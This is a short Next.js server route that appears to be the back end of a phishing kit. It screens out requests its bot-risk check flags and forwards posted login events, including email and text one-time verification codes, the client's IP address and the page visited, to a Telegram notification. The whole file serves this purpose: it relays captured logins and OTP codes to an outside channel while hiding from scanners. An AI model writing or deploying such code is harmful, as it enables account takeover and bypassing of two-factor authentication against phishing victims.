import { NextRequest, NextResponse } from "next/server"
import { sendTelegramNotification } from "@/lib/telegram"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { isMitigationBand } from "@/lib/bot-risk/score"
import { resolveRequestRisk } from "@/lib/bot-risk/resolve"

export async function POST(req: NextRequest) {
  try {
    const risk = await resolveRequestRisk(req)
    if (isMitigationBand(risk.band)) {
      return NextResponse.json({ ok: false, error: "Forbidden" }, { status: 403 })
    }

    const body = (await req.json()) as Record<string, unknown>
    const ip = getClientIpFromRequest(req) || "Unknown"

    const eventType = String(body.eventType || body.type || "login")
    const resolvedType =
      eventType === "verification"
        ? body.method === "email"
          ? "login_email_otp_verification"
          : "login_text_otp_verification"
        : eventType

    const result = await sendTelegramNotification({
      ...body,
      type: resolvedType,
      ip,
      page: String(body.page || body.url || "/"),
      timestamp: new Date().toISOString(),
      otp: body.code ? String(body.code) : body.otp ? String(body.otp) : undefined,
    } as any)

    return NextResponse.json({ ok: Boolean(result), success: Boolean(result) })
  } catch (err) {
    console.error("[telegram] route error:", err)
    return NextResponse.json({ ok: false, success: false }, { status: 500 })
  }
}
